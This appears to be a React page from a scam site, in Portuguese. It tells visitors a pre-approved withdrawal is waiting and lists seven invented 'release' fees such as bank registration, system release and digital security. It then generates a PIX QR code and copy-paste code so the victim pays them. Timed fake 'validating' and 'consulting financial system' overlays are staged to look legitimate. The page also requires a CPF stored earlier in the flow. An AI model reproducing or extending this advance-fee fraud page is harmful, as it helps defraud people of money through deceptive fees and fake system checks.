import { useState, useMemo, useEffect, useCallback } from "react";
import { useLocation, useSearch } from "wouter";
import { QrCode } from "lucide-react";
import { Button } from "@/components/ui/button";
import Header from "@/components/Header";
import PromoBar from "@/components/PromoBar";
import Footer from "@/components/Footer";
import LoadingOverlay from "@/components/LoadingOverlay";

type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";

const taxas = [
  { nome: "Taxa de Registro Bancario", valor: 18.9 },
  { nome: "Taxa de Liberacao de Sistema", valor: 14.5 },
  { nome: "Taxa de Validacao Financeira", valor: 9.8 },
  { nome: "Taxa de Processamento", valor: 11.2 },
  { nome: "Taxa de Seguranca Digital", valor: 7.9 },
  { nome: "Taxa de Autenticacao", valor: 6.4 },
  { nome: "Taxa Administrativa", valor: 9.42 },
];

const TOTAL_TAXAS = taxas.reduce((sum, t) => sum + t.valor, 0);

export default function Confirmacao() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);

  const [step, setStep] = useState<Step>("saque");
  const [loadingText, setLoadingText] = useState("Validando...");
  const [isGeneratingPix, setIsGeneratingPix] = useState(false);

  const [qrCodeBase64, setQrCodeBase64] = useState<string | null>(null);
  const [copiaECola, setCopiaECola] = useState<string | null>(null);
  const [pixError, setPixError] = useState<string | null>(null);

  useEffect(() => {
    if (!localStorage.getItem("cpfUsuario")) {
      setLocation("/");
    }
  }, [setLocation]);

  const handleSolicitar = useCallback(() => {
    setStep("loading-taxas");
    setLoadingText("Consultando sistema financeiro...");
    setTimeout(() => {
      setStep("taxas");
    }, 2000);
  }, []);

  const handlePagarPix = useCallback(async () => {
    if (isGeneratingPix) return;

    setIsGeneratingPix(true);
    setPixError(null);
    setStep("loading-pix");

    try {
      const response = await fetch("/api/create-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: Math.round(TOTAL_TAXAS * 100),
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.details || data.error || "Erro ao gerar PIX");
      }

      if (!data.qrCodeBase64 || !data.copiaECola) {
        throw new Error("Resposta inválida da API");
      }

      setQrCodeBase64(data.qrCodeBase64);
      setCopiaECola(data.copiaECola);
      setStep("pix");
    } catch (error: any) {
      setPixError(error.message);
      setStep("taxas");
    } finally {
      setIsGeneratingPix(false);
    }
  }, [isGeneratingPix]);

  const copiarPix = () => {
    if (!copiaECola) return;
    navigator.clipboard.writeText(copiaECola);
    alert("Código PIX copiado!");
  };

  return (
    <div className="min-h-screen bg-[#F6F6F6] flex flex-col">
      <PromoBar />
      <Header />

      <main className="flex-1 py-12 px-4">
        <div className="max-w-lg mx-auto text-center">

          {step === "saque" && (
            <div className="bg-white rounded-2xl p-8 shadow">
              <h1 className="text-2xl font-bold mb-6">
                Saque Pré-Aprovado Disponível
              </h1>

              <Button
                onClick={handleSolicitar}
                className="w-full bg-[#E0007A] text-white rounded-full"
              >
                Solicitar Valor
              </Button>
            </div>
          )}

          {step === "taxas" && (
            <div className="bg-white rounded-2xl p-8 shadow">
              <h2 className="text-xl font-bold mb-4">
                Taxas para Liberação do Saque
              </h2>

              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6">
                <h3 className="text-2xl font-bold text-[#EC008C]">
                  R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}
                </h3>
              </div>

              {pixError && (
                <div className="bg-red-100 text-red-600 p-3 rounded-lg mb-4 text-sm">
                  {pixError}
                </div>
              )}

              <Button
                onClick={handlePagarPix}
                disabled={isGeneratingPix}
                className="w-full bg-[#E0007A] text-white rounded-full"
              >
                {isGeneratingPix ? "Gerando PIX..." : "Pagar com PIX"}
              </Button>
            </div>
          )}

          {step === "pix" && (
            <div className="bg-white rounded-2xl p-8 shadow">
              <div className="flex justify-center mb-4">
                <QrCode className="w-10 h-10 text-[#EC008C]" />
              </div>

              <h3 className="text-xl font-bold mb-4">
                Pagamento via PIX
              </h3>

              {qrCodeBase64 && (
                <div className="flex justify-center mb-5">
                  <img
                    src={`data:image/png;base64,${qrCodeBase64}`}
                    alt="QR Code PIX"
                    className="w-[220px] h-[220px] border rounded-lg"
                  />
                </div>
              )}

              {copiaECola && (
                <>
                  <textarea
                    readOnly
                    value={copiaECola}
                    className="w-full border rounded-lg p-3 text-xs mb-3"
                  />
                  <Button
                    onClick={copiarPix}
                    className="w-full bg-[#E0007A] text-white rounded-full"
                  >
                    Copiar Código PIX
                  </Button>
                </>
              )}
            </div>
          )}
        </div>
      </main>

      <Footer />

      <LoadingOverlay
        visible={step === "loading-taxas"}
        title="Validando..."
        subtitle={loadingText}
        duration={2000}
      />

      <LoadingOverlay
        visible={step === "loading-pix"}
        title="Gerando pagamento PIX..."
        subtitle="Conectando ao sistema de pagamentos..."
        duration={3000}
      />
    </div>
  );
}